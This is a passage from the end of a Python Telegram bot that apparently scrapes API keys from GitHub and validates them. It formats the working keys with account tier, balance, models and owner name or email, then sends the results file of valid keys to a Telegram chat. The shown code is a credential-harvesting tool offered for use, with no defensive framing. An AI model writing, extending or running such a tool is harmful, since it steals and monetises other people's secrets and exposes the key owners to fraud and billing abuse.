                        f.write(f"Characters Remaining: {key_info['details'].get('chars_remaining', 0):,}\n")
                        f.write(f"Usage Percentage: {key_info['details'].get('usage_percent', 0):.1f}%\n")
                    
                    elif validation_type == "anthropic" and key_info['details'].get("status") != "credit_insufficient":
                        f.write(f"Account Type: {'Premium' if key_info['details'].get('has_claude3', False) else 'Standard'}\n")
                        f.write(f"Available Models: {', '.join(key_info['details'].get('models', [])[:3])}\n")
                    
                    elif validation_type == "twilio":
                        f.write(f"Account Name: {key_info['details'].get('name', 'N/A')}\n")
                        f.write(f"Account Type: {key_info['details'].get('type', 'N/A')}\n")
                        f.write(f"Account Status: {key_info['details'].get('status', 'N/A')}\n")
                        f.write(f"Balance: {key_info['details'].get('balance', 'N/A')} {key_info['details'].get('currency', 'USD')}\n")
                    
                    elif validation_type == "runwayml" and key_info['details'].get("status") != "no_billing":
                        f.write(f"Organization: {key_info['details'].get('org_name', 'Unknown')}\n")
                        f.write(f"Credit Balance: {key_info['details'].get('credit_balance', 0)}\n")
                    
                    elif validation_type == "minimax":
                        f.write(f"User Name: {key_info['details'].get('user_name', 'Unknown')}\n")
                        f.write(f"Email: {key_info['details'].get('email', 'Unknown')}\n")
                        f.write(f"Group: {key_info['details'].get('group_name', 'Unknown')}\n")
                    
                    elif validation_type == "perplexity" and key_info['details'].get("status") != "rate_limited":
                        # Only include Pro account info if it's a Pro account
                        if key_info['details'].get('has_pro', False):
                            f.write(f"Account Type: Pro\n")
                            # Only include models if they exist and are not default
                            models = key_info['details'].get('models', [])
                            if models and models != ["sonar"] and len(models) > 1:
                                f.write(f"Available Models: {', '.join(models[:3])}\n")
                    
                    f.write("\n")
            
            # Write regular valid keys
            if regular_keys_list:
                f.write("=============== REGULAR VALID KEYS ===============\n\n")
                for key_info in regular_keys_list:
                    f.write(f"Key: {key_info['api_key']}\n")
                    f.write(f"Status: {key_info['status_text']}\n")
                    
                    # Add additional details based on validation type
                    if validation_type == "openai" and key_info['details'].get("status") != "quota_exceeded":
                        f.write(f"Account Type: {'Paid' if key_info['details'].get('has_gpt4', False) else 'Free'}\n")
                        f.write(f"Available Models: {', '.join(key_info['details'].get('models', [])[:3])}\n")
                    
                    elif validation_type == "elevenlabs":
                        f.write(f"Character Limit: {key_info['details'].get('character_limit', 0):,}\n")
                        f.write(f"Characters Used: {key_info['details'].get('character_count', 0):,}\n")
                        f.write(f"Characters Remaining: {key_info['details'].get('chars_remaining', 0):,}\n")
                        f.write(f"Usage Percentage: {key_info['details'].get('usage_percent', 0):.1f}%\n")
                    
                    elif validation_type == "anthropic" and key_info['details'].get("status") != "credit_insufficient":
                        f.write(f"Account Type: {'Premium' if key_info['details'].get('has_claude3', False) else 'Standard'}\n")
                        f.write(f"Available Models: {', '.join(key_info['details'].get('models', [])[:3])}\n")
                    
                    elif validation_type == "twilio":
                        f.write(f"Account Name: {key_info['details'].get('name', 'N/A')}\n")
                        f.write(f"Account Type: {key_info['details'].get('type', 'N/A')}\n")
                        f.write(f"Account Status: {key_info['details'].get('status', 'N/A')}\n")
                        f.write(f"Balance: {key_info['details'].get('balance', 'N/A')} {key_info['details'].get('currency', 'USD')}\n")
                    
                    # Don't include the Account Type: Free and Available Models: sonar for Perplexity
                    # Only include Pro account info and non-default models
                    elif validation_type == "perplexity" and key_info['details'].get("status") != "rate_limited":
                        # Skip adding any details for free accounts
                        pass
                    
                    f.write("\n")
            
            # Add summary at the end
            f.write("\n=== SUMMARY ===\n")
            f.write(f"Total API Keys Processed: {len(api_keys)}\n")
            f.write(f"Valid API Keys Found: {valid_keys_count}\n")
            f.write(f"Special/Premium Keys Found: {special_keys_count}\n")
        
        # Send final message and the results file
        telegram_edit_message(
            status_message.chat_id,
            status_message.message_id,
            f"✅ Bulk validation complete!\n\n"
            f"Total API Keys Processed: {len(api_keys)}\n"
            f"Valid API Keys Found: {valid_keys_count}\n"
            f"Special/Premium Keys Found: {special_keys_count}\n\n"
            f"Sending results file with valid keys..."
        )
        
        # Send the results file
        telegram_send_document(
            status_message.chat_id,
            results_file,
            f"📋 Valid {validation_type.upper()} API keys - {valid_keys_count} found"
        )
        
    except Exception as e:
        # Handle any exceptions
        error_message = f"❌ An error occurred during bulk validation: {str(e)}"
        telegram_edit_message(
            status_message.chat_id,
            status_message.message_id,
            error_message
        )

def main():
    """Start the bot."""
    global app
    
    # Check if GitHub token is set
    if not GITHUB_TOKEN:
        print("Error: GITHUB_TOKEN environment variable is not set")
        sys.exit(1)
    
    print("Starting GitHub API Key Scraper & Validator Telegram bot...")
    print("Press Ctrl+C to stop the bot")
    
    try:
        # Create the application
        application = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
        
        # Make the app available globally
        app = application
        
        # Add command handlers
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("help", help_command))
        application.add_handler(CommandHandler("status", status))
        application.add_handler(CommandHandler("scrape", scrape))
        application.add_handler(CommandHandler("scrape_multiple", scrape_multiple))
        application.add_handler(CommandHandler("bulk_validate", bulk_validate))
        application.add_handler(CommandHandler("bulk_validate_help", bulk_validate_help))
        
        # Add callback query handler for inline buttons
        application.add_handler(CallbackQueryHandler(button_callback))
        
        # Add file handler for document uploads
        application.add_handler(MessageHandler(filters.Document.TEXT, process_file))
        
        # Add message handler for text input following menu selections
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
        
        # Start polling
        print("Bot is running. Send messages to your bot on Telegram!")
        application.run_polling()
        
    except Exception as e:
        print(f"Error starting bot: {str(e)}")
        sys.exit(1)

if __name__ == '__main__':
    main() 
